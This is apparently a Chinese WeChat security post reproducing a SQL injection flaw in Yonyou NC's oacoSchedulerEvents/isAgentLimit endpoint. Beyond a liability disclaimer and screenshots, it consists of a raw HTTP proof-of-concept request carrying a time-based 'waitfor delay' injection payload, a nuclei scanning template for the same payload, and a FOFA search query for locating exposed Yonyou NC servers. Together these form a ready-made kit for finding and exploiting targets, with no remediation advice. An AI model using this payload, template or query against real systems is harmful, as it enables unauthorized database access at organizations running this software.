#  【新】用友NC-oacoSchedulerEvents-SQL注入漏洞复现   
小白菜安全  小白菜安全   2024-06-13 22:57  
  
**免责声明**  
  
该公众号主要是分享互联网上公开的一些漏洞poc和工具，  
利用本公众号所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，本公众号及作者不为此承担任何责任，一旦造成后果请自行承担！如果本公众号分享导致的侵权行为请告知，我们会立即删除并道歉。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/NhLcT1kxlia1Au88bO1jFd8V3AmqMvsqEZUFalBicQwJaic1tesic3duRuGPPQ3E1vczEJ67UzoMicSWMZpKwRElxtA/640?wx_fmt=png "")  
  
**漏洞影响范围**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/NhLcT1kxlia3RQ89yKXIjpnwBUCxZTus42IBVZxOukAMicprerMQWY5v9IqlCU5giaicHK3YGFL3gXOkmXpC34wE3w/640?wx_fmt=png&from=appmsg "")  
#  漏洞复现  
  
**poc**  
```
延时注入5秒
GET /portal/pt/oacoSchedulerEvents/isAgentLimit?pageId=login&pk_flowagent=1%27waitfor+delay+%270:0:5%27-- HTTP/1.1
Host: 
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
Connection: close
```  
  
出现如下数据表示漏洞存在  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/NhLcT1kxlia3RQ89yKXIjpnwBUCxZTus4uB85mhgOzfEm7HkjD4LnO0QuFnrTLuKiaGmRAHrewudsCLvfSzJ0kjQ/640?wx_fmt=png&from=appmsg "")  
  
**nuclei脚本**  
```
id: yongyou-nc-oacoSchedulerEvents-sqli

info:
  name: 用友NC oacoSchedulerEvents-SQL注入
  author: 小白菜
  severity: high
  description: |
    
  metadata:
    fofa-query: 
  reference:
    - https://
  tags: auto

http:
  - method: GET
    path:
      - "{{BaseURL}}/portal/pt/oacoSchedulerEvents/isAgentLimit?pageId=login&pk_flowagent=1'waitfor+delay+'0:0:5'--"

    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - 'duration>=5'
```  
# 搜索语法  
  
**fofa:app="用友-UFIDA-NC"**  
  
